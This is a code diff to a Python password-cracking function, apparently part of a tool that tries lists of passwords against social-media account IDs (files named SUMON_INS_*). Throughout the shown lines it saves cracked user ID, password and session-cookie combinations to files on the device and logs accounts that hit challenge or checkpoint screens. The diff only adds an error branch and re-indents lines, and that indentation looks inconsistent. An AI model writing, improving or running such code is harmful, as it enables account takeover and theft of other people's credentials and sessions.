@@ -250,17 +250,20 @@ def crack(uid, password_list, total_count):
                            print("Cookies:", cookies)
                            open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookies+"\n")
                            oks.append(uid)
-                           return True     
+                           return True 
+                else:
+                  #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
+                   continue
             elif 'challenge_required' in response.text:
-                #print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
-                open("/sdcard/SUMON_INS_CH.txt","a").write(uid+"|"+pw+"\n")
-                cps.append(uid)
-                continue
+                   #print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
+                   open("/sdcard/SUMON_INS_CH.txt","a").write(uid+"|"+pw+"\n")
+                   cps.append(uid)
+                   continue
             elif 'checkpoint_required' in response.text:
-                #print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
-                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
-                cps.append(uid)
-                continue
+                   #print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
+                   open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
+                   cps.append(uid)
+                   continue
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
